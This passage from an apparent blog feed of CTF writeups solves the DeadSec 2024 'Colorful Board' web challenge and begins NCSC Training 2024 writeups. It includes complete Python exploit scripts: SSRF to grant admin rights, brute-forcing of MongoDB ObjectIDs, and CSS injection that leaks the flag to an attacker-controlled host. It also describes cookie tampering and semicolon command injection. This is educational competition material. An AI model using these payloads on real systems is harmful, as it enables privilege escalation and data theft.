    <span class="k">async</span> <span class="nf">renderAllNotice</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">notices</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">adminService</span><span class="p">.</span><span class="nf">getAllNotice</span><span class="p">();</span>
        <span class="k">return</span> <span class="p">{</span> <span class="na">notices</span><span class="p">:</span> <span class="nx">notices</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">notice</span> <span class="o">=&gt;</span> <span class="o">!</span><span class="nx">notice</span><span class="p">.</span><span class="nx">title</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">))</span> <span class="p">};</span> <span class="c1">// Fun!</span>
    <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Becoming Admin</li>
</ul>

<p>A lot of work to do, let’s split the steps first thing first, we need to be an admin, after spending hours in the code looking for what could work and what couldn’t, we can call the <code class="language-plaintext highlighter-rouge">GET /admin/grant?username</code> through the <code class="language-plaintext highlighter-rouge">GET /admin/report</code> endpoin because it has no restrictions or filters.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Colorful-Board curl <span class="s1">'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/report?url=http://127.0.0.1:1337/admin/grant?username=oz'</span> <span class="nt">-H</span> <span class="s2">"Cookie: </span><span class="nv">$cookie</span><span class="s2">"</span>
<span class="o">{</span><span class="s2">"status"</span>:200,<span class="s2">"message"</span>:<span class="s2">"Reported."</span><span class="o">}</span>
</code></pre></div></div>

<p>We relogin and now are Admin!</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  sample-colorful_board curl <span class="s1">'https://eb7655042aed5ebaba63a259.deadsec.quest/admin/notice'</span> <span class="nt">-H</span> <span class="s2">"Cookie: </span><span class="nv">$cookie</span><span class="s2">"</span>
&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"ko"</span><span class="o">&gt;</span>
<span class="c"># ..</span>
<span class="c"># ..</span>
</code></pre></div></div>

<ul>
  <li>Getting the second part of the flag</li>
</ul>

<p>Now we can see the notices but not the one that has the flag, we will skip the first part for now and focus on the second part you will see why later (it’s easier 😅).</p>

<p>We have two notices IDs and the flag is inbetween them</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/admin/notice/66a67f8a5abd7894b69f2d68"</span><span class="nt">&gt;</span>asdf<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/admin/notice/66a67f905abd7894b69f2d6a"</span><span class="nt">&gt;</span>qwer<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
</code></pre></div></div>
<p>If you notice the IDs are similar, only minor and predictable because of how mongodb ObjectID works. During the CTF my script was trying all possible iterations on the differencet characters because somehow the difference was only 2 characters which is a small charset to bruteforce. Now it’s 3 so it’s not efficient I had to find another way to predict that and it’s when I found this <a href="https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb#mongo-objectid-predict">hacktricks</a> page.
This gives a better idea on how we should predict the id, <code class="language-plaintext highlighter-rouge">66a67f8a5abd7894b69f2d68</code> is the first and <code class="language-plaintext highlighter-rouge">66a67f905abd7894b69f2d6a</code> is the third, the last char differ by 2 i.e in the middle our flag notice id will end with 9, left two more chars which just need to be bruteforced.</p>

<p>If we look at the IDs in our local image it will look like this which will comfirm that which is also detailed in the article linked above.</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">cb&gt;</span><span class="w"> </span><span class="err">db.notices.find()</span><span class="w">
</span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e63387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">68</span><span class="err">')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'asdf'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'asdf'</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e68387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">69</span><span class="err">')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'flag'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'FAKE_FLAG</span><span class="p">}</span><span class="err">'</span><span class="w">
  </span><span class="err">}</span><span class="p">,</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="err">_id:</span><span class="w"> </span><span class="err">ObjectId('</span><span class="mi">66</span><span class="err">a</span><span class="mi">66e6</span><span class="err">c</span><span class="mi">387296</span><span class="err">b</span><span class="mi">1</span><span class="err">ad</span><span class="mi">9</span><span class="err">f</span><span class="mi">2</span><span class="err">d</span><span class="mi">6</span><span class="err">a')</span><span class="p">,</span><span class="w">
    </span><span class="err">title:</span><span class="w"> </span><span class="err">'qwer'</span><span class="p">,</span><span class="w">
    </span><span class="err">content:</span><span class="w"> </span><span class="err">'qwer'</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>
<p>And here is the final script to automate everything we done so far and get the second part of the flag.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">threading</span>

<span class="c1"># url = "http://127.0.0.1:1337/"
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://eb7655042aed5ebaba63a259.deadsec.quest/</span><span class="sh">"</span>
<span class="n">creds</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">personalColor</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">blue</span><span class="sh">"</span><span class="p">}</span>
<span class="n">access_token</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">flag_id</span> <span class="o">=</span> <span class="sh">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

<span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
    <span class="n">url</span>
    <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/report?url=http://localhost:1337/admin/grant?username=</span><span class="si">{</span><span class="n">creds</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">creds</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">admin/notice</span><span class="sh">"</span><span class="p">)</span>
<span class="n">ids</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">notice/([a-f0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">ids</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">s</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/notice/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span>


<span class="k">def</span> <span class="nf">process_id</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="nf">get_id</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>


<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">50</span>

<span class="k">for</span> <span class="n">b1</span><span class="p">,</span> <span class="n">b2</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">ids</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ids</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
    <span class="k">if</span> <span class="n">b1</span> <span class="o">==</span> <span class="n">b2</span><span class="p">:</span>
        <span class="n">flag_id</span> <span class="o">+=</span> <span class="n">b1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">flag_id</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">#</span><span class="sh">"</span>
<span class="n">flag_id</span> <span class="o">=</span> <span class="n">flag_id</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">9</span><span class="sh">"</span>  <span class="c1"># last char is always 9
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">):</span>  <span class="c1"># we could use itertools.product but it's not necessary
</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">flag_id</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">##</span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">process_id</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="nb">id</span><span class="p">,))</span>
    <span class="n">threads</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">threads</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
            <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
        <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

</code></pre></div></div>

<p>And we got the first part!</p>

<p><img src="/assets/images/deadsec-writeups/colorful-board-01.png" alt="Colorful Board" /></p>

<ul>
  <li>Getting the first part of the flag</li>
</ul>

<p>Now to get the first part I spent some hours looking around, until I thought that the challenge name should mean something especially that when we do register we can specify a color to have for our user account which is used in some places in the application.</p>

<p><img src="/assets/images/deadsec-writeups/colorful-board-02.png" alt="Colorful Board" /></p>

<p>How is that relevant? We can use this to inject some CSS/XSS(doesn’t work) to leak the admin’s page or some of it’s content when doing report. Now let’s skip the XSS though I spent most of the time trying to make it work, but on the website nothing reflects and outside the website we can’t access it’s content or do CSRF because of the same-origin policy.</p>

<p>So now we have <a href="https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection">CSS injection</a> we need a good page to leak the flag from, the <code class="language-plaintext highlighter-rouge">/post/edit/:id</code> which the admin can access has what we need</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>common/views/post-edit.hbs:            color: <span class="o">}</span>
</code></pre></div></div>
<p><img src="/assets/images/deadsec-writeups/colorful-board-03.png" alt="Colorful Board" /></p>

<p>Now from the hacktricks we know we can leak chars from the page by using the <code class="language-plaintext highlighter-rouge">background-image</code> like this for example:</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">input</span><span class="o">[</span><span class="nt">class</span><span class="o">=</span><span class="nt">user</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"D"</span><span class="o">]</span> <span class="p">{</span>
    <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("http://attacker.com/flag/D")</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>If the flag starts with <code class="language-plaintext highlighter-rouge">D</code> we will get a request to <code class="language-plaintext highlighter-rouge">http://attacker.com/flag/D</code> and so on for the rest of the flag.</p>

<p>Now all we need is a script to generate accounts with different colors chars to see what the flag looks like, I have seen many solves and all of them were semi-automated because of how this whole thing is. So here is a little different approach 🙂</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">flask</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">digits</span><span class="p">,</span> <span class="n">ascii_letters</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">from</span> <span class="n">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span><span class="p">,</span> <span class="n">Retry</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://eb7655042aed5ebaba63a259.deadsec.quest/</span><span class="sh">"</span>
<span class="n">server</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://REDACTED/</span><span class="sh">"</span>
<span class="n">charset</span> <span class="o">=</span> <span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_{}-</span><span class="sh">"</span><span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">DEAD{</span><span class="sh">"</span>

<span class="n">max_threads</span> <span class="o">=</span> <span class="mi">5</span>


<span class="k">def</span> <span class="nf">check_flag</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">ozs</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">personalColor</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">blue;</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sh">"</span><span class="s">}</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">input[class=</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="s">][value^=</span><span class="sh">'</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="s">]</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sh">"</span><span class="s">{</span><span class="sh">"</span>
        <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">background-image: url(</span><span class="sh">'</span><span class="si">{</span><span class="n">server</span><span class="si">}</span><span class="s">oz/</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
    <span class="p">)</span>
    <span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ozs</span><span class="sh">"</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
    <span class="n">retries</span> <span class="o">=</span> <span class="nc">Retry</span><span class="p">(</span>
        <span class="n">total</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">backoff_factor</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">status_forcelist</span><span class="o">=</span><span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">600</span><span class="p">)]</span>
    <span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">mount</span><span class="p">(</span><span class="sh">"</span><span class="s">http://</span><span class="sh">"</span><span class="p">,</span> <span class="nc">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retries</span><span class="p">))</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">auth/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">accessToken</span><span class="sh">"</span><span class="p">])</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">post/write</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">title</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">})</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">post/</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">post_id</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">post/([a-f0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">post_id</span><span class="p">,</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/report?url=http://localhost:1337/post/edit/</span><span class="si">{</span><span class="n">post_id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">return</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/solve</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">solve</span><span class="p">():</span>
    <span class="n">oldflag</span> <span class="o">=</span> <span class="n">flag</span>
    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">oldflag</span> <span class="o">!=</span> <span class="n">flag</span><span class="p">:</span>
            <span class="k">break</span>

        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">check_flag</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="p">,))</span>
        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="n">threads</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>

        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">threads</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
                <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="k">return</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/oz/&lt;path:path&gt;</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">flag</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">path</span>

    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">solve</span><span class="p">).</span><span class="nf">start</span><span class="p">()</span>

    <span class="k">return</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/deadsec-writeups/colorful-board-04.png" alt="Colorful Board" /></p>]]></content><author><name>Ahmad Abuzaid</name><email>iiahmad435@gmail.com</email></author><category term="CTF" /><category term="Writeups" /><category term="ctf" /><category term="writeups" /><category term="deadsec-ctf" /><summary type="html"><![CDATA[This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the DeadSec team. The CTF was held on 28th July 2024. My team scored place 48/619 with 1081 points.]]></summary></entry><entry><title type="html">NCSC Training 2024 Writeups</title><link href="http://0.0.0.0:8000/writeups/ncsc-training-2024" rel="alternate" type="text/html" title="NCSC Training 2024 Writeups" /><published>2024-07-13T00:00:00+03:00</published><updated>2024-07-13T00:00:00+03:00</updated><id>http://0.0.0.0:8000/writeups/ncsc-training-2024</id><content type="html" xml:base="http://0.0.0.0:8000/writeups/ncsc-training-2024"><![CDATA[<p>Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.</p>

<h1 id="writeups">Writeups</h1>

<h2 id="web">Web</h2>

<h3 id="robot">Robot</h3>

<h4 id="challenge-description">Challenge Description</h4>

<p>A Web crawler, sometimes called a robot, is an Internet bot that systematically browses the World Wide Web and that is typically operated by search engines for the purpose of Web indexing.</p>

<h4 id="solution">Solution</h4>

<p>The challenge is a simple <code class="language-plaintext highlighter-rouge">robots.txt</code> as the name says, we can see <code class="language-plaintext highlighter-rouge">Disallow: /always_read_robots.txt</code> in the <code class="language-plaintext highlighter-rouge">robots.txt</code> file. So, we can access the <code class="language-plaintext highlighter-rouge">always_read_robots.txt</code> file and get the flag.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-robot.png" alt="ncsc-training-robot" /></p>

<h3 id="privilege">Privilege</h3>

<h4 id="challenge-description-1">Challenge Description</h4>

<p>Cookies are a widely used way to enable authentication in many of the applications out there.</p>

<h4 id="solution-1">Solution</h4>

<p>The challenge is a simple cookie manipulation challenge. We can see the cookie <code class="language-plaintext highlighter-rouge">admin=false</code> in the browser. We can change the value of the cookie to <code class="language-plaintext highlighter-rouge">true</code> and get the flag.</p>

<p><img src="/assets/images/ncsc-training-writeups/ncsc-training-2024-privilege.png" alt="ncsc-training-privilege" /></p>

<h3 id="injectxec">InjectXec</h3>

<h4 id="challenge-description-2">Challenge description</h4>

<p>&lt; No Description Provided &gt;</p>

<h4 id="solution-2">Solution</h4>

<p>It was a simple command injection, we can escape the <code class="language-plaintext highlighter-rouge">figlet</code> command context to pass any system commands using a semi-colon <code class="language-plaintext highlighter-rouge">;</code>. The source code  looked like this when I extracted it:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Text Banner Generator<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"style.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
